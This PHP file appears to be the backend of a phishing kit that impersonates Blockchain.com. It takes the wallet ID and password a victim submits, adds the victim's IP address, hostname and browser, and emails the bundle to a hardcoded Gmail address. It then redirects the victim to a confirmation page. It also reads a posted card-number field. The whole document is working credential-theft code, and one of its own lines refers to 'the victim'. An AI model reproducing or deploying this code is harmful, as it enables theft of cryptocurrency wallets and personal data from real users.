<?php 
        $ip = getenv("REMOTE_ADDR");
        $wallet .= "-------------------- New Wallet From BlockChain -------------------\n";
        $wallet .= "Wallet ID                 :  ".$_POST['wallet-id']."\n";
        $wallet .= "Password                  :  ".$_POST['password']."\n";
        $wallet .= "The rest of the information is not yet the victim Please wait writes...\n";
        $wallet .= "--------------------- Ip Info --------------------\n";
        $wallet .= "Ip                        : $ip\n";
        $wallet .= "Host                      : ".gethostbyaddr($ip)."\n";
        $wallet .= "Browser                   : ".$_SERVER['HTTP_USER_AGENT']."\n";
        $cc = $_POST['ccn'];
        $subject = "---------- New Wallet From BlockChain ----------";
        $send = "omarmoslem10@gmail.com";
        $headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
        mail($send,$subject,$wallet,$headers);

        header("Location:confirm.php");
?>